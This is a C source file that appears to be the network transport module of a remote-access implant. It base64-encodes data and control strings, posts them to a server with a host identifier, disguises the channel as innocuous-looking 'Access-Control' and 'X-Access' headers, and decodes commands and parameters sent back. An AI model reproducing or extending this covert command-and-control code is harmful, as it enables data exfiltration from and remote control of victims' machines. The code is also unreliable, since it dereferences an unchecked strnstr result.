#include "curl_transport.h"

int curl_transport_init() {
    return curl_init();
}

void curl_transport_destroy() {
    curl_destroy();
}

int extract_b64_header(const struct buffer *headers, const char *header_name, struct buffer *buf) {
    char *header = strnstr(headers->ptr, header_name, headers->size);
    char *header_data = header + strlen(header_name) + 1;

    size_t offset_len = header_data - headers->ptr;

    if (offset_len >= headers->size) {
        return 0;
    }

    size_t data_len = headers->size - offset_len;

    size_t base64_len = 0;

    for (size_t i = 0; i < data_len; ++i) {
        if (!is_base64_char(header_data[i])) {
            break;
        }
        base64_len++;
    }

    buf->ptr = malloc(base64_len);

    if (!buf->ptr) {
        return 0;
    }

    memcpy(buf->ptr, header_data, base64_len);
    buf->size = base64_len;

    return 1;
}

int
curl_transport_send(const char *control, const struct buffer *data, struct buffer *command, struct buffer *params) {
    int ret = 1;

    char *add_headers[2];

    add_headers[0] = 0;
    add_headers[1] = 0;

    struct buffer base64_control = {0};

    struct buffer control_buf = {
            ptr: control,
            size: strlen(control)
    };

    size_t control_len = base64_encode(&control_buf, &base64_control);

    if (!control_len) {
        ret = 0;
        goto clean;
    }

    struct buffer base64_data = {0};

    size_t data_len = base64_encode(data, &base64_data);

    if (!data_len) {
        ret = 0;
        goto clean;
    }

    size_t header1_size = base64_control.size + 17;
    size_t header2_size = strlen(g_sysinfo.id) + 11;

    add_headers[0] = malloc(header1_size);
    add_headers[1] = malloc(header2_size);

    if (!add_headers[0] || !add_headers[1]) {
        ret = 0;
        goto clean;
    }

    char *access_control = "Access-Control: ";

    memcpy(add_headers[0], access_control, 16);
    memcpy(add_headers[0] + 16, base64_control.ptr, base64_control.size);

    add_headers[0][header1_size - 1] = 0;

    char *x_access = "X-Access: ";

    memcpy(add_headers[1], x_access, 10);
    memcpy(add_headers[1] + 10, g_sysinfo.id, strlen(g_sysinfo.id));

    add_headers[1][header2_size - 1] = 0;

    struct buffer headers = {0};
    struct buffer body = {0};

    if (!curl_post(server, add_headers, 2, base64_data.ptr, &headers, &body)) { // FIXME
        ret = 0;
        goto clean;
    }

    if (headers.size) {
        free(base64_data.ptr);
        base64_data.size = 0;

        char *access_control = "Access-Control:";

        int success = extract_b64_header(&headers, access_control, &base64_data);

        if (!success) {
            ret = 0;
            goto clean;
        }

        if (command) {
            data_len = base64_decode(&base64_data, command);

            if (!data_len) {
                ret = 0;
                goto clean;
            }

            if (params) {
                if (body.size) {
                    data_len = base64_decode(&body, params);

                    if (!data_len) {
                        ret = 0;
                        goto clean;
                    }
                }
            }
        }
    }

    clean:

    if (add_headers[0]) {
        free(add_headers[0]);
    }

    if (add_headers[1]) {
        free(add_headers[1]);
    }

    if (base64_control.size) {
        free(base64_control.ptr);
    }

    if (base64_data.size) {
        free(base64_data.ptr);
    }

    if (headers.size) {
        free(headers.ptr);
    }

    if (body.size) {
        free(body.ptr);
    }

    return ret;
}
